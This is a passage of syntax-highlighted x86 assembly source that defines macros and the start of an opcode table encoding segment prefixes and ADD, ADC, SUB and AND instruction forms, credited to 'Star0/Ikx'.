</span><span class="sc5">variance8</span><span class="sc0">       </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc5">operand2</span><span class="sc0">       </span><span class="sc1">; 1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">&amp;</span><span class="sc5">binary</span><span class="sc4">&amp;</span><span class="sc0">                        </span><span class="sc1">; 4 + 2 = 6</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc4">(((((</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc0">

</span><span class="sc1">;       db  -1</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">variance8b</span><span class="sc0">      </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">&amp;</span><span class="sc5">binary</span><span class="sc4">&amp;</span><span class="sc0">                        </span><span class="sc1">; 4 + 2 = 6</span><span class="sc0">

</span><span class="sc1">;       db  -1</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc5">instruction16</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc9">name</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0">

</span><span class="sc5">iip</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;:</span><span class="sc0">
</span><span class="sc5">ii</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">iip</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">iitable</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">                 </span><span class="sc1">; 0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc5">operand2</span><span class="sc0">       </span><span class="sc1">; 2-3</span><span class="sc0">

                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">&amp;</span><span class="sc5">binary</span><span class="sc4">&amp;</span><span class="sc0">                        </span><span class="sc1">; 5</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc4">(((((</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc0">

</span><span class="sc1">;               db      '&amp;name&amp;',-1</span><span class="sc0">

</span><span class="sc5">ii_</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc5">_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">instruction16b</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc9">name</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0">

</span><span class="sc5">iip</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;:</span><span class="sc0">
</span><span class="sc5">ii</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">iip</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">iitable</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">                 </span><span class="sc1">; 0</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">&amp;</span><span class="sc5">binary</span><span class="sc4">&amp;</span><span class="sc0">                        </span><span class="sc1">; 5</span><span class="sc0">

</span><span class="sc1">;               db      '&amp;name&amp;',-1</span><span class="sc0">

</span><span class="sc5">ii_</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc5">_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">variance16</span><span class="sc0">      </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc5">operand2</span><span class="sc0">       </span><span class="sc1">; 1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">&amp;</span><span class="sc5">binary</span><span class="sc4">&amp;</span><span class="sc0">                        </span><span class="sc1">; 4 + 2 = 6</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc4">(((((</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc0">

</span><span class="sc1">;       db  -1</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">variance16b</span><span class="sc0">     </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">&amp;</span><span class="sc5">binary</span><span class="sc4">&amp;</span><span class="sc0">                        </span><span class="sc1">; 4 + 2 = 6</span><span class="sc0">

</span><span class="sc1">;       db  -1</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">prefix</span><span class="sc0">      </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">binary</span><span class="sc0">

        </span><span class="sc9">endm</span><span class="sc0">    

</span><span class="sc1">; 159 different intruction recognized - 371 total entries</span><span class="sc0">

</span><span class="sc5">iitable</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc5">prefix</span><span class="sc0">  </span><span class="sc5">pRV</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01100110b</span><span class="sc0">              </span><span class="sc1">; 66h</span><span class="sc0">
      </span><span class="sc5">prefix</span><span class="sc0">  </span><span class="sc5">pRVb</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01100111b</span><span class="sc0">              </span><span class="sc1">; 67h</span><span class="sc0">
      </span><span class="sc5">prefix</span><span class="sc0">  </span><span class="sc5">pCS</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00101110b</span><span class="sc0">
      </span><span class="sc5">prefix</span><span class="sc0">  </span><span class="sc5">pDS</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111110b</span><span class="sc0">
      </span><span class="sc5">prefix</span><span class="sc0">  </span><span class="sc5">pES</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00100110b</span><span class="sc0">
      </span><span class="sc5">prefix</span><span class="sc0">  </span><span class="sc5">pFS</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01100100b</span><span class="sc0">
      </span><span class="sc5">prefix</span><span class="sc0">  </span><span class="sc5">pGS</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01101101b</span><span class="sc0">
      </span><span class="sc5">prefix</span><span class="sc0">  </span><span class="sc5">pSS</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00110110b</span><span class="sc0">

</span><span class="sc1">; Intel opcode include (Crunched version) revision 1 by Star0/Ikx</span><span class="sc0">

 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000001000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">             </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">              </span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">             </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000001000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">             </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000000000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">ADC</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001001000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001000000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8b</span><span class="sc0">             </span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00010100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000001000010000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000000000010000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010101000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010100000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8b</span><span class="sc0">             </span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00101100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000001000101000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000000000101000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010001000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010000000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
